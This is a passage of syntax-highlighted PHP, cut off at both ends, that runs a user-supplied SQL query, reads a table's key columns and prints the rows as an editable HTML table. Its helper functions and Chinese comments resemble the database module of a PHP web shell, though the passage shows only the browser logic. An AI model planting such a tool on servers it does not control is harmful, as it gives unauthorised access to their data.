<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">sql_line</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(array(</span><span style="color: #8abeb7;">"\r"</span>, <span style="color: #8abeb7;">"\n"</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">"\t"</span><span style="text-decoration: underline;">), </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">array(</span><span style="color: #8abeb7; text-decoration: underline;">' '</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">' '</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">' '</span><span style="text-decoration: underline;">), </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">trim(htmlspecialchars(</span><span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">query</span><span style="text-decoration: underline;">)));</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">sql_line</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">preg_replace(</span><span style="color: #8abeb7;">"/\/\*[^(\*\/)]</span><span style="color: #8abeb7; text-decoration: underline;">*\*\//i"</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">" "</span><span style="text-decoration: underline;">, $</span><span style="color: #f0c674; text-decoration: underline;">sql_line</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">preg_match_all(</span><span style="color: #8abeb7;">"/from\s+`{0,1}([\w]+)`{0</span><span style="color: #8abeb7; text-decoration: underline;">,1}\s+/i"</span><span style="text-decoration: underline;">,$</span><span style="color: #f0c674; text-decoration: underline;">sql_line</span><span style="text-decoration: underline;">,$</span><span style="color: #f0c674; text-decoration: underline;">matches</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">tablename</span> = $<span style="color: #f0c674;">matches</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>][<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>];
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/*********************</span><span style="color: #969896; font-style: italic;">/</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">getfield</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"SHOW COLUMNS FROM $tablename"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">rowdb</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">keyfied</span> = <span style="color: #8abeb7;">''</span>; <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#20027;&#38190;&#23383;&#27573;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>($<span style="color: #f0c674;">row</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_fetch_assoc(</span>$<span style="color: #f0c674;">getfield</span>)) <span style="text-decoration: underline;">{</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">rowdb</span>[$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>]][<span style="color: #8abeb7;">'Key'</span>] = $<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Key</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">];</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">rowdb</span>[$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>]][<span style="color: #8abeb7;">'Extra'</span>] = $<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'E</span><span style="color: #8abeb7; text-decoration: underline;">xtra'</span><span style="text-decoration: underline;">];</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Key'</span>] == <span style="color: #8abeb7;">'UNI'</span> || $<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Key'</span>] <span style="text-decoration: underline;">== </span><span style="color: #8abeb7; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">keyfied</span> = $<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>];
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/*********************</span><span style="color: #969896; font-style: italic;">/</span><span style="color: #cc6666; background-color: #373b41;">                     </span><span style="color: #cc6666; background-color: #373b41; text-decoration: underline;">            </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#30452;&#25509;&#27983;&#35272;&#34920;&#25353;&#29031;&#20027;&#38190;&#38477;&#24207;&#25490;&#21015;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">keyfied</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">strtolower(substr(</span>$<span style="color: #f0c674;">query</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">1</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">3</span><span style="text-decoration: underline;">)) == </span><span style="color: #8abeb7; text-decoration: underline;">'select * from'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">query</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span><span style="color: #8abeb7;">" LIMIT "</span>, <span style="color: #8abeb7;">" order </span><span style="color: #8abeb7; text-decoration: underline;">by $keyfied DESC LIMIT "</span><span style="text-decoration: underline;">, $</span><span style="color: #f0c674; text-decoration: underline;">query</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">result</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span>$<span style="color: #f0c674;">query</span>);

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span>$<span style="color: #f0c674;">multipage</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;table border="0" cellpadding="3" cellspa</span><span style="color: #8abeb7; text-decoration: underline;">cing="0"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">allowedit</span>) <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Action&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fieldnum</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_num_fields(</span>$<span style="color: #f0c674;">result</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>($<span style="color: #f0c674;">i</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;$<span style="color: #f0c674;">i</span>&lt;$<span style="color: #f0c674;">fieldnum</span>;$<span style="color: #f0c674;">i</span>++){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">name</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_field_name(</span>$<span style="color: #f0c674;">result</span>, $<span style="color: #f0c674;">i</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">type</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_field_type(</span>$<span style="color: #f0c674;">result</span>, $<span style="color: #f0c674;">i</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">len</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_field_len(</span>$<span style="color: #f0c674;">result</span>, $<span style="color: #f0c674;">i</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)</span><span style="color: #8abeb7; text-decoration: underline;">"</span><span style="text-decoration: underline;">.(($</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #f0c674; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #f0c674; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) ? </span><span style="color: #8abeb7; text-decoration: underline;">'&lt;b&gt; - PRIMARY&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #f0c674; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> ? </span><span style="color: #8abeb7; text-decoration: underline;">'&lt;b&gt; - Auto&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">"&lt;/span&gt;&lt;/td&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>($<span style="color: #f0c674;">mn</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_fetch_assoc(</span>$<span style="color: #f0c674;">result</span>)){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">thisbg</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">bg(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="'</span>.$<span style="color: #f0c674;">thisbg</span>.<span style="color: #8abeb7;">'" onmouseover="</span><span style="color: #8abeb7; text-decoration: underline;">this.className=\'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">where</span> = $<span style="color: #f0c674;">tmp</span> = $<span style="color: #f0c674;">b1</span> = <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#36873;&#21462;&#26465;&#20214;&#23383;&#27573;&#29992;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>($<span style="color: #f0c674;">mn</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">key</span>=&gt;$<span style="color: #f0c674;">inside</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">inside</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#26597;&#25214;&#20027;&#38190;&#12289;&#21807;&#19968;&#23646;&#24615;&#12289;&#33258;&#21160;&#22686;&#21152;&#30340;&#23383;&#27573;&#65292;&#25214;&#21040;&#23601;&#20572;&#27490;&#65292;&#21542;&#21017;&#32452;&#21512;&#25152;&#26377;</span><span style="color: #969896; font-style: italic; text-decoration: underline;">&#23383;&#27573;&#20316;&#20026;&#26465;&#20214;&#12290;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">rowdb</span>[$<span style="color: #f0c674;">key</span>][<span style="color: #8abeb7;">'Key'</span>] == <span style="color: #8abeb7;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #f0c674; text-decoration: underline;">key</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> || $</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #f0c674; text-decoration: underline;">key</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">where</span> = $<span style="color: #f0c674;">key</span>.<span style="color: #8abeb7;">"='"</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">addslashe</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">s(</span><span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">inside</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">"'"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">break</span>;
